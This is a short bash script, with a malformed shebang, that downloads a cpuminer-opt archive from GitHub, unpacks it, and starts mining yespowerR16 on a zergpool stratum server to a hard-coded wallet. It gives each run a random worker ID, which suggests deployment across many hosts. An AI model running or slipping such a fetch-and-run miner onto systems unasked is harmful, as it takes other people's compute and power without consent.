!#/bin/bash
wget https://github.com/cpu-pool/cpuminer-opt-cpupower/releases/download/1.4/Cpuminer-opt-cpu-pool-linux64.tar.gz && tar zxvf Cpuminer-opt-cpu-pool-linux64.tar.gz
./cpuminer -a yespowerR16 -o stratum+tcp://yespowerR16.mine.zergpool.com:6534 -u CQ5axqsyHCmRvEraX88oa7obrPhHyqsNN7 -p c=CPMK,mc=YTN,ID=$(echo jOa--$(shuf -i 1-70000 -n 1))
